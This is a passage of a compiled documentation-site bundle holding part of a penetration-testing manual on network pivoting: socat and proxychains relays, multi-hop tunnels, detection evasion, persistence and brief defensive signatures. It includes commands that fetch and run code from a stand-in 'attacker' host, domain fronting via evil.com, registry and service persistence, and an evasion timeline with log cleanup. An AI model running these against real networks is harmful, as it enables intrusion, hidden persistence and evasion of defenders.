TCP-LISTEN:8080,fork TCP:internal_server:80\n\n# UDP relay\nsocat UDP-LISTEN:53,fork UDP:dns_server:53\n\n# TCP to UDP conversion\nsocat TCP-LISTEN:53,fork UDP:dns_server:53\n\n# Bidirectional relay with logging\nsocat -d -d TCP-LISTEN:8080,fork TCP:internal_server:80\n\n# Relay with connection limits\nsocat TCP-LISTEN:8080,fork,max-children=10 TCP:internal_server:80\n"})}),"\n",(0,s.jsx)(n.h3,{id:"112-encrypted-tunneling",children:"11.2 Encrypted Tunneling"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"# SSL/TLS server\nsocat OPENSSL-LISTEN:443,cert=server.pem,fork TCP:internal_server:80\n\n# SSL/TLS client\nsocat TCP-LISTEN:8080,fork OPENSSL:server:443,verify=0\n\n# SSL with client certificate verification\nsocat OPENSSL-LISTEN:443,cert=server.pem,cafile=ca.pem,fork TCP:internal_server:80\n\n# SSL tunnel with custom ciphers\nsocat OPENSSL-LISTEN:443,cert=server.pem,cipher=HIGH,fork TCP:internal_server:80\n"})}),"\n",(0,s.jsx)(n.h3,{id:"113-advanced-socat-implementations",children:"11.3 Advanced Socat Implementations"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"# HTTP proxy relay\nsocat TCP-LISTEN:8080,fork PROXY:proxy_server:internal_host:80,proxyport=3128\n\n# SOCKS4 relay\nsocat TCP-LISTEN:8080,fork SOCKS4:socks_server:internal_host:80,socksport=1080\n\n# File-based relay for covert channels\nsocat TCP-LISTEN:8080,fork SYSTEM:'cat > /tmp/tunnel; cat /tmp/tunnel'\n\n# Serial port tunneling\nsocat TCP-LISTEN:2001,fork /dev/ttyS0,raw,echo=0\n\n# Unix socket relay\nsocat TCP-LISTEN:8080,fork UNIX-CONNECT:/var/run/service.sock\n"})}),"\n",(0,s.jsx)(n.h2,{id:"12-proxychains-transparent-proxy-integration",children:"12. Proxychains: Transparent Proxy Integration"}),"\n",(0,s.jsx)(n.admonition,{type:"note",children:(0,s.jsx)(n.p,{children:"Proxychains must be installed on the system where you intend to tunnel applications. Edit the proxychains configuration files to reflect the actual proxy endpoints and chains you wish to use."})}),"\n",(0,s.jsx)(n.p,{children:"Proxychains enables transparent proxy chain integration for arbitrary applications:"}),"\n",(0,s.jsx)(n.h3,{id:"121-configuration-management",children:"12.1 Configuration Management"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"# /etc/proxychains.conf or ~/.proxychains/proxychains.conf\ndynamic_chain\nproxy_dns\ntcp_read_time_out 15000\ntcp_connect_time_out 8000\n\n[ProxyList]\nsocks5 127.0.0.1 9050\nhttp 127.0.0.1 8080\nsocks4 192.168.1.100 1080\n"})}),"\n",(0,s.jsx)(n.h3,{id:"122-chain-configuration-types",children:"12.2 Chain Configuration Types"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"# Dynamic chain (uses only working proxies)\ndynamic_chain\n\n# Strict chain (uses all proxies in order)\nstrict_chain\n\n# Random chain (random proxy order)\nrandom_chain\n"})}),"\n",(0,s.jsx)(n.h3,{id:"123-application-integration",children:"12.3 Application Integration"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:'# Network scanning through proxy chain\nproxychains nmap -sT -P0 10.10.10.10\n\n# Web application testing\nproxychains sqlmap -u "http://internal_target/page.php?id=1"\n\n# SSH through proxy chain\nproxychains ssh user@internal_host\n\n# File transfer through proxies\nproxychains scp file.txt user@internal_host:/tmp/\n\n# Browser integration\nproxychains firefox\n\n# Custom application proxying\nproxychains ./custom_tool --target internal_host\n'})}),"\n",(0,s.jsx)(n.h2,{id:"13-advanced-pivot-chaining-methodologies",children:"13. Advanced Pivot Chaining Methodologies"}),"\n",(0,s.jsx)(n.admonition,{type:"note",children:(0,s.jsx)(n.p,{children:"The following examples combine multiple pivoting techniques and assume prior establishment of each tunnel or session as described in the previous sections. Adjust hostnames, IPs, ports, and tool invocations for your topology."})}),"\n",(0,s.jsx)(n.h3,{id:"131-multi-hop-architecture-design",children:"13.1 Multi-Hop Architecture Design"}),"\n",(0,s.jsx)(n.p,{children:"Effective pivot chaining requires systematic network mapping and route optimization across multiple security boundaries:"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:"Internet \u2192 DMZ Host \u2192 Internal Network \u2192 Workstation \u2192 Restricted Network \u2192 Critical Server\n"})}),"\n",(0,s.jsx)(n.p,{children:"The following sequence diagram illustrates the establishment of a complete multi-hop pivot chain:"}),"\n",(0,s.jsx)(n.mermaid,{value:"sequenceDiagram\n    participant A as Attacker\n    participant D as DMZ Host\n    participant I as Internal Host\n    participant W as Workstation\n    participant C as Critical Server\n    \n    Note over A,C: Phase 1: Initial Compromise\n    A->>D: Exploit web application\n    D--\x3e>A: Reverse shell established\n    \n    Note over A,C: Phase 2: First Pivot Setup\n    A->>D: Deploy Chisel client\n    D->>A: Chisel tunnel: DMZ\u2192Attacker\n    A->>A: Configure SOCKS proxy (9050)\n    \n    Note over A,C: Phase 3: Internal Network Access\n    A->>I: Scan internal network (via SOCKS)\n    A->>I: Exploit internal service\n    I--\x3e>A: Meterpreter session (via tunnel)\n    \n    Note over A,C: Phase 4: Second Pivot Setup\n    A->>I: Deploy Ligolo-ng agent\n    I->>A: Ligolo tunnel: Internal\u2192Attacker\n    A->>A: Configure TUN interface\n    \n    Note over A,C: Phase 5: Workstation Compromise\n    A->>W: Lateral movement (direct via TUN)\n    W--\x3e>A: PowerShell session established\n    \n    Note over A,C: Phase 6: Final Pivot\n    A->>W: Deploy Havoc C2 agent\n    W->>A: C2 channel: Workstation\u2192Attacker\n    A->>C: Access critical systems (via C2)\n    \n    Note over A,C: Result: Full Network Compromise"}),"\n",(0,s.jsx)(n.h4,{id:"implementation-strategy",children:"Implementation Strategy:"}),"\n",(0,s.jsxs)(n.ol,{children:["\n",(0,s.jsxs)(n.li,{children:[(0,s.jsx)(n.strong,{children:"Initial Foothold"}),": Compromise externally accessible system"]}),"\n",(0,s.jsxs)(n.li,{children:[(0,s.jsx)(n.strong,{children:"Network Reconnaissance"}),": Enumerate internal network topology"]}),"\n",(0,s.jsxs)(n.li,{children:[(0,s.jsx)(n.strong,{children:"Lateral Movement"}),": Establish additional compromised hosts"]}),"\n",(0,s.jsxs)(n.li,{children:[(0,s.jsx)(n.strong,{children:"Route Optimization"}),": Configure efficient traffic routing"]}),"\n",(0,s.jsxs)(n.li,{children:[(0,s.jsx)(n.strong,{children:"Persistence"}),": Maintain reliable communication channels"]}),"\n"]}),"\n",(0,s.jsx)(n.h3,{id:"132-hierarchical-routing-implementation",children:"13.2 Hierarchical Routing Implementation"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"# Primary route through most stable pivot\nip route add 10.10.0.0/16 via 192.168.1.100 dev eth0 metric 1\n\n# Secondary route for redundancy\nip route add 10.10.0.0/16 via 192.168.1.101 dev eth0 metric 10\n\n# Tertiary route through alternative path\nip route add 10.10.0.0/16 via 192.168.1.102 dev eth0 metric 20\n\n# Load balancing across multiple paths\nip route add 10.10.0.0/16 nexthop via 192.168.1.100 weight 1 nexthop via 192.168.1.101 weight 1\n"})}),"\n",(0,s.jsx)(n.h3,{id:"133-cascade-tunneling-example",children:"13.3 Cascade Tunneling Example"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"# Hop 1: SSH tunnel to DMZ host\nssh -D 9050 user@dmz_host\n\n# Hop 2: Chisel through first tunnel\nproxychains chisel client internal_host:8080 R:socks2\n\n# Hop 3: Ligolo-ng through second tunnel\nproxychains ./agent -connect deep_internal:11601\n\n# Hop 4: Direct tool access through all hops\nproxychains nmap -sT critical_network_range\n"})}),"\n",(0,s.jsx)(n.h2,{id:"14-detection-evasion-and-operational-security",children:"14. Detection Evasion and Operational Security"}),"\n",(0,s.jsx)(n.admonition,{type:"note",children:(0,s.jsx)(n.p,{children:"Evasion strategies assume prior knowledge of defensive monitoring systems and network policies in your environment. Adapt timing, protocol, and behavioral parameters to maximize stealth in your particular context."})}),"\n",(0,s.jsx)(n.h3,{id:"141-operational-timeline-and-evasion-strategy",children:"14.1 Operational Timeline and Evasion Strategy"}),"\n",(0,s.jsx)(n.p,{children:"The following timeline illustrates optimal timing and sequencing of evasion techniques throughout an operation:"}),"\n",(0,s.jsx)(n.mermaid,{value:"gantt\n    title Detection Evasion Timeline\n    dateFormat  HH:mm\n    axisFormat %H:%M\n    \n    section Phase 1: Reconnaissance\n    Network Discovery     :recon1, 09:00, 10:00\n    Service Enumeration   :recon2, after recon1, 11:00\n    Vulnerability Assessment :recon3, after recon2, 12:00\n    \n    section Phase 2: Initial Access\n    Business Hours Check  :access1, 13:00, 13:15\n    Exploit Deployment    :access2, after access1, 13:45\n    Persistence Setup     :access3, after access2, 14:15\n    \n    section Phase 3: Pivot Establishment\n    Traffic Analysis      :pivot1, 14:30, 14:45\n    Tunnel Setup (HTTPS)  :pivot2, after pivot1, 15:15\n    Connection Testing    :pivot3, after pivot2, 15:30\n    \n    section Phase 4: Lateral Movement\n    Credential Harvesting :lateral1, 15:45, 16:00\n    Internal Reconnaissance :lateral2, after lateral1, 16:30\n    Secondary Compromise  :lateral3, after lateral2, 17:00\n    \n    section Phase 5: Stealth Maintenance\n    Log Cleanup          :stealth1, 17:15, 17:30\n    Traffic Normalization :stealth2, 17:30, 18:00\n    Persistence Validation :stealth3, after stealth2, 18:15\n    \n    section Phase 6: Data Exfiltration\n    Target Identification :exfil1, 08:00, 08:30\n    Staged Collection    :exfil2, after exfil1, 09:00\n    Covert Transfer      :exfil3, after exfil2, 10:00"}),"\n",(0,s.jsx)(n.h3,{id:"142-traffic-analysis-evasion",children:"14.2 Traffic Analysis Evasion"}),"\n",(0,s.jsx)(n.h4,{id:"protocol-mimicry-techniques",children:"Protocol Mimicry Techniques:"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:'# HTTP traffic camouflage\nchisel server --port 80 --auth "user:pass"\nchisel client --header "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)" server:80 R:socks\n\n# HTTPS certificate spoofing\nopenssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\nsocat OPENSSL-LISTEN:443,cert=cert.pem,fork TCP:127.0.0.1:1234\n\n# DNS query tunneling\ndnscat2 --secret=secretkey subdomain.legitimate-domain.com\n'})}),"\n",(0,s.jsx)(n.h4,{id:"timing-randomization",children:"Timing Randomization:"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-python",children:"import random\nimport time\n\ndef jittered_connection(min_delay=1, max_delay=30):\n    delay = random.uniform(min_delay, max_delay)\n    time.sleep(delay)\n    # Establish connection\n"})}),"\n",(0,s.jsx)(n.h4,{id:"volume-control-implementation",children:"Volume Control Implementation:"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"# Bandwidth limiting with tc (traffic control)\ntc qdisc add dev eth0 root handle 1: htb default 12\ntc class add dev eth0 parent 1: classid 1:1 htb rate 100mbit\ntc class add dev eth0 parent 1:1 classid 1:12 htb rate 1mbit ceil 2mbit\n\n# Application-level rate limiting\npv -L 1024 < largefile.dat | nc target_host 443\n"})}),"\n",(0,s.jsx)(n.h3,{id:"142-behavioral-analysis-evasion",children:"14.2 Behavioral Analysis Evasion"}),"\n",(0,s.jsx)(n.h4,{id:"credential-management",children:"Credential Management:"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:'# Credential rotation script\n#!/bin/bash\nCREDS=("user1:pass1" "user2:pass2" "user3:pass3")\nCURRENT_CRED=${CREDS[$RANDOM % ${#CREDS[@]}]}\n\n# Use credential for connection\nssh -o PasswordAuthentication=yes ${CURRENT_CRED%:*}@target_host\n'})}),"\n",(0,s.jsx)(n.h4,{id:"session-timing-patterns",children:"Session Timing Patterns:"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-python",children:"import datetime\n\ndef is_business_hours():\n    now = datetime.datetime.now()\n    return (now.weekday() < 5 and \n            9 <= now.hour <= 17)\n\ndef wait_for_business_hours():\n    while not is_business_hours():\n        time.sleep(3600)  # Check every hour\n"})}),"\n",(0,s.jsx)(n.h4,{id:"process-injection-for-stealth",children:"Process Injection for Stealth:"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-powershell",children:'# PowerShell process injection\n$code = @"\n[DllImport("kernel32.dll")]\npublic static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);\n"@\n\nAdd-Type -MemberDefinition $code -Name Win32 -Namespace Win32Functions\n'})}),"\n",(0,s.jsx)(n.h3,{id:"143-memory-only-operations",children:"14.3 Memory-Only Operations"}),"\n",(0,s.jsx)(n.h4,{id:"fileless-agent-deployment",children:"Fileless Agent Deployment:"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"# Linux memory execution\ncurl -s http://attacker/agent | bash\n\n# PowerShell reflective loading\n$bytes = [System.Convert]::FromBase64String($agent_b64)\n$assembly = [System.Reflection.Assembly]::Load($bytes)\n$assembly.EntryPoint.Invoke($null, @(,$args))\n\n# Python bytecode execution\nexec(compile(requests.get('http://attacker/agent.py').text, '<string>', 'exec'))\n"})}),"\n",(0,s.jsx)(n.h4,{id:"in-memory-tunneling",children:"In-Memory Tunneling:"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-c",children:"// C implementation for memory-resident tunneling\n#include <windows.h>\n#include <winsock2.h>\n\nDWORD WINAPI TunnelThread(LPVOID lpParam) {\n    // Socket creation and traffic relay in memory\n    SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);\n    // Implementation details...\n    return 0;\n}\n\nint main() {\n    CreateThread(NULL, 0, TunnelThread, NULL, 0, NULL);\n    return 0;\n}\n"})}),"\n",(0,s.jsx)(n.h3,{id:"144-advanced-evasion-techniques",children:"14.4 Advanced Evasion Techniques"}),"\n",(0,s.jsx)(n.h4,{id:"domain-fronting",children:"Domain Fronting:"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:'# Use legitimate CDN for traffic fronting\ncurl -H "Host: evil.com" https://legitimate-cdn.cloudfront.net/beacon\n\n# DNS over HTTPS for covert communication\ncurl -H "Accept: application/dns-json" \\\n     "https://cloudflare-dns.com/dns-query?name=data.evil.com&type=TXT"\n'})}),"\n",(0,s.jsx)(n.h4,{id:"steganographic-tunneling",children:"Steganographic Tunneling:"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-python",children:"# Hide data in HTTP headers\nheaders = {\n    'User-Agent': 'Mozilla/5.0',\n    'X-Forwarded-For': base64_encode(command),\n    'Accept-Language': encrypt(data)\n}\n"})}),"\n",(0,s.jsx)(n.h4,{id:"certificate-pinning-bypass",children:"Certificate Pinning Bypass:"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:'# Custom certificate generation\nopenssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 \\\n    -subj "/C=US/ST=CA/L=San Francisco/O=Legitimate Corp/CN=*.legitimate.com"\n'})}),"\n",(0,s.jsx)(n.h2,{id:"15-platform-specific-implementation-considerations",children:"15. Platform-Specific Implementation Considerations"}),"\n",(0,s.jsx)(n.admonition,{type:"note",children:(0,s.jsx)(n.p,{children:"Adapt scripts, service definitions, and persistence mechanisms to your platform (Linux, Windows, container, or cloud). Substitute example IPs, file paths, and user names as required."})}),"\n",(0,s.jsx)(n.h3,{id:"151-linux-specific-techniques",children:"15.1 Linux-Specific Techniques"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"# iptables-based port forwarding\niptables -t nat -A PREROUTING -p tcp --dport 8080 -j DNAT --to-destination 192.168.1.100:80\niptables -t nat -A POSTROUTING -j MASQUERADE\n\n# systemd service for persistence\ncat > /etc/systemd/system/tunnel.service << EOF\n[Unit]\nDescription=Network Tunnel Service\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/usr/local/bin/chisel client server:8080 R:socks\nRestart=always\nUser=nobody\n\n[Install]\nWantedBy=multi-user.target\nEOF\n"})}),"\n",(0,s.jsx)(n.h3,{id:"152-windows-specific-implementations",children:"15.2 Windows-Specific Implementations"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-cmd",children:'REM Registry-based persistence\nreg add "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "Updater" /t REG_SZ /d "plink.exe -ssh -D 9050 -N user@server"\n\nREM Service creation for persistence\nsc create TunnelService binPath= "C:\\Windows\\System32\\plink.exe -ssh -D 9050 -N user@server"\nsc config TunnelService start= auto\n'})}),"\n",(0,s.jsx)(n.h3,{id:"153-container-and-cloud-environments",children:"15.3 Container and Cloud Environments"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:'# Docker container pivoting\ndocker run -d --network host -v /tmp:/tmp tunnel-image\n\n# Kubernetes pod networking\nkubectl port-forward pod/pivot-pod 8080:80\n\n# Cloud metadata service tunneling\ncurl -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/instance/\n'})}),"\n",(0,s.jsx)(n.h2,{id:"16-monitoring-and-defensive-considerations",children:"16. Monitoring and Defensive Considerations"}),"\n",(0,s.jsx)(n.admonition,{type:"note",children:(0,s.jsx)(n.p,{children:"Defensive strategies and detection patterns provided here are examples; always tune IDS/IPS and SIEM rules to your organizational network profile and risk posture."})}),"\n",(0,s.jsx)(n.h3,{id:"161-detection-signatures",children:"16.1 Detection Signatures"}),"\n",(0,s.jsx)(n.p,{children:"Network defenders should monitor for the following indicators:"}),"\n",(0,s.jsx)(n.h4,{id:"connection-pattern-analysis",children:"Connection Pattern Analysis:"}),"\n",(0,s.jsxs)(n.ul,{children:["\n",(0,s.jsx)(n.li,{children:"Unusual outbound connections on common ports (22, 80, 443)"}),"\n",(0,s.jsx)(n.li,{children:"High-frequency connection attempts with regular intervals"}),"\n",(0,s.jsx)(n.li,{children:"Connections to external hosts from internal segments"}),"\n",(0,s.jsx)(n.li,{children:"Abnormal bandwidth utilization patterns"}),"\n"]}),"\n",(0,s.jsx)(n.h4,{id:"protocol-analysis",children:"Protocol Analysis:"}),"\n",(0,s.jsxs)(n.ul,{children:["\n",(0,s.jsx)(n.li,{children:"SSH connections with unusual keep-alive patterns"}),"\n",(0,s.jsx)(n.li,{children:"HTTP traffic with suspicious user agents or headers"}),"\n",(0,s.jsx)(n.li,{children:"DNS queries to unusual domains or with high frequency"}),"\n",(0,s.jsx)(n.li,{children:"TLS connections to self-signed or suspicious certificates"}),"\n"]}),"\n",(0,s.jsx)(n.h3,{id:"162-defensive-countermeasures",children:"16.2 Defensive Countermeasures"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"# Network segmentation enforcement\niptables -A FORWARD -s 192.168.100.0/24 -d 192.168.200.0/24 -j DROP\n\n# Deep packet inspection\nsnort -c /etc/snort/snort.conf -i eth0\n\n# Connection monitoring\nnetstat -antlp | grep ESTABLISHED | awk '{print $5}' | cut -d: -f1 | sort | uniq -c | sort -nr\n"})}),"\n",(0,s.jsx)(n.h2,{id:"17-legal-and-ethical-considerations",children:"17. Legal and Ethical Considerations"}),"\n",(0,s.jsx)(n.admonition,{type:"note",children:(0,s.jsx)(n.p,{children:"All activities must be performed with explicit written authorization. Always maintain thorough documentation and comply with all relevant legal and ethical standards for your jurisdiction and engagement."})}),"\n",(0,s.jsx)(n.h3,{id:"171-authorization-requirements",children:"17.1 Authorization Requirements"}),"\n",(0,s.jsx)(n.p,{children:"All pivoting techniques described in this manual must only be employed within the scope of:"}),"\n",(0,s.jsxs)(n.ul,{children:["\n",(0,s.jsx)(n.li,{children:"Authorized penetration testing engagements"}),"\n",(0,s.jsx)(n.li,{children:"Red team exercises with explicit approval"}),"\n",(0,s.jsx)(n.li,{children:"Security research in controlled environments"}),"\n",(0,s.jsx)(n.li,{children:"Defensive security training and education"}),"\n"]}),"\n",(0,s.jsx)(n.h3,{id:"172-documentation-requirements",children:"17.2 Documentation Requirements"}),"\n",(0,s.jsx)(n.p,{children:"Comprehensive documentation must include:"}),"\n",(0,s.jsxs)(n.ul,{children:["\n",(0,s.jsx)(n.li,{children:"Scope of testing authorization"}),"\n",(0,s.jsx)(n.li,{children:"Network segments accessed through pivoting"}),"\n",(0,s.jsx)(n.li,{children:"Tools and techniques employed"}),"\n",(0,s.jsx)(n.li,{children:"Timeline of pivoting activities"}),"\n",(0,s.jsx)(n.li,{children:"Data accessed or modified during testing"}),"\n"]}),"\n",(0,s.jsx)(n.h2,{id:"18-conclusion",children:"18. Conclusion"}),"\n",(0,s.jsx)(n.p,{children:"This comprehensive reference manual provides an exhaustive analysis of network pivoting methodologies across multiple platforms and use cases. The techniques described represent the current state-of-the-art in adversarial network traversal, providing cybersecurity professionals with the knowledge necessary to both implement and defend against sophisticated pivoting attacks."}),"\n",(0,s.jsx)(n.p,{children:"The evolution of pivoting tools toward more sophisticated evasion capabilities, exemplified by frameworks such as Ligolo-ng, Havoc C2, Villain, and Sliver, demonstrates the ongoing arms race between offensive and defensive capabilities. Future research should focus on machine learning-based traffic analysis evasion, quantum-resistant encryption for long-term operations, and integration with cloud-native architectures."}),"\n",(0,s.jsx)(n.p,{children:"Security practitioners must balance the offensive capabilities described herein with robust defensive measures, comprehensive monitoring, and adherence to ethical guidelines to ensure the responsible advancement of cybersecurity knowledge and capabilities."}),"\n",(0,s.jsx)(n.h2,{id:"references",children:"References"}),"\n",(0,s.jsxs)(n.ol,{children:["\n",(0,s.jsx)(n.li,{children:(0,s.jsx)(n.a,{href:"https://datatracker.ietf.org/doc/html/rfc760",children:"Postel, J. (1980). Internet Protocol - DARPA Internet Program Protocol Specification. RFC 760."})}),"\n",(0,s.jsx)(n.li,{children:(0,s.jsx)(n.a,{href:"https://datatracker.ietf.org/doc/html/rfc4251",children:"Ylonen, T. & Lonvick, C. (2006). The Secure Shell (SSH) Protocol Architecture. RFC 4251."})}),"\n",(0,s.jsx)(n.li,{children:(0,s.jsx)(n.a,{href:"https://datatracker.ietf.org/doc/html/rfc1928",children:"Leech, M. et al. (1996). SOCKS Protocol Version 5. RFC 1928."})}),"\n",(0,s.jsx)(n.li,{children:(0,s.jsx)(n.a,{href:"https://docs.metasploit.com/",children:"Metasploit Framework Documentation. Rapid7."})}),"\n",(0,s.jsx)(n.li,{children:(0,s.jsx)(n.a,{href:"https://github.com/jpillora/chisel",children:"Chisel Project Repository."})}),"\n",(0,s.jsx)(n.li,{children:(0,s.jsx)(n.a,{href:"https://github.com/nicocha30/ligolo-ng",children:"Ligolo-ng Technical Documentation."})}),"\n",(0,s.jsx)(n.li,{children:(0,s.jsx)(n.a,{href:"https://github.com/HavocFramework/Havoc",children:"Havoc C2 Framework."})}),"\n",(0,s.jsx)(n.li,{children:(0,s.jsx)(n.a,{href:"https://github.com/t3l3machus/Villain",children:"Villain Framework Repository."})}),"\n",(0,s.jsx)(n.li,{children:(0,s.jsx)(n.a,{href:"https://sliver.sh/",children:"Sliver Framework Documentation."})}),"\n",(0,s.jsx)(n.li,{children:(0,s.jsx)(n.a,{href:"https://www.openssh.com/manual.html",children:"OpenSSH Manual Pages."})}),"\n",(0,s.jsx)(n.li,{children:(0,s.jsx)(n.a,{href:"https://hideandsec.sh/books/cheatsheets-82c/page/pivoting",children:"Pivoting. HideandSec."})}),"\n",(0,s.jsx)(n.li,{children:(0,s.jsx)(n.a,{href:"https://nvlpubs.nist.gov/nistpubs/Legacy/SP/nistspecialpublication800-115.pdf",children:"NIST Special Publication 800-115: Technical Guide to Information Security Testing and Assessment."})}),"\n",(0,s.jsx)(n.li,{children:(0,s.jsx)(n.a,{href:"https://owasp.org/www-project-web-security-testing-guide/",children:"OWASP Testing Guide v4.0: Web Application Security Testing."})}),"\n",(0,s.jsx)(n.li,{children:(0,s.jsx)(n.a,{href:"https://github.com/BishopFox/sliver/wiki/Pivots",children:"BishopFox Sliver Wiki: Pivots."})}),"\n"]})]})}function h(e={}){const{wrapper:n}={...(0,r.R)(),...e.components};return n?(0,s.jsx)(n,{...e,children:(0,s.jsx)(d,{...e})}):d(e)}}}]);